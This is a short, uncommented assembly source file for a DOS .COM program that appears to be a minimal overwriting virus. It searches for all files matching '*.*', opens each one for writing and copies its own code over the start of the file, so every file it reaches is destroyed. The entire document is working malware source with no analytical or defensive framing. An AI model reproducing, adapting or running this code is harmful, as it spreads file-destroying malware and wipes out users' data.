                   model   tiny
                   codeseg
                   locals
                   org     100h

    start:         db     '*.*',0

                   mov    ah,4eh
                   xor    cx,cx
                   mov    dx,si
    next:          int    21h
                   jc     last

                   mov    ax,3d02h
                   mov    dx,9eh
                   int    21h
                   xchg   ax,bx
                   mov    ah,40h
                   mov    cl,eov-start
                   mov    dx,si
                   int    21h
                   mov    ah,4fh
                   jmp    next

    last:          ret

    eov:           end     start
